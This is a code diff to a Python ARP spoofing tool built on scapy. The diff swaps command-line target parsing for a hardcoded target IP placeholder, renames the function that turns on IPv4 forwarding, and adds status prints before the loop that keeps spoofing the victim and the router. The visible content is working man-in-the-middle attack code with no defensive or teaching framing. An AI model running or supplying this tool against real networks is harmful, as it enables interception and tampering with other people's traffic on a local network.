@@ -3,19 +3,8 @@
 import re
 import scapy.all as scapy
 import subprocess
-import optparse
 import time
 import sys
-
-def get_arguments():
-    parser = optparse.OptionParser()
-
-    parser.add_option("-t", "--target", dest="target", help="The IP of target machine.")
-
-    (options, arguments) = parser.parse_args()
-    if not options.target:
-        parser.error("[.] Please specify a target IP, use --help for more info")
-    return options
 
 
 def scan(ip):
@@ -44,19 +33,20 @@ def restore(dest, src):
     scapy.send(packet, count=4, verbose=False)
 
 
-def enable_ipv4():
+def enable_ipv4_forwarding():
     file=open("/proc/sys/net/ipv4/ip_forward","w")
     file.write("1")
     file.close()
 
 
 
-options = get_arguments()
 router_ip = get_router()
 sent_count = 0
-target_ip = options.target
-print(router_ip)
-enable_ipv4()
+target_ip = "255.255.255.255" # Enter the target IP here
+print("[+] Starting ARP Spoofing...")
+print("Router IP: " + router_ip)
+print("Target IP:" + target_ip)
+enable_ipv4_forwarding()
 try:
     while True:
         spoof(target_ip, router_ip)
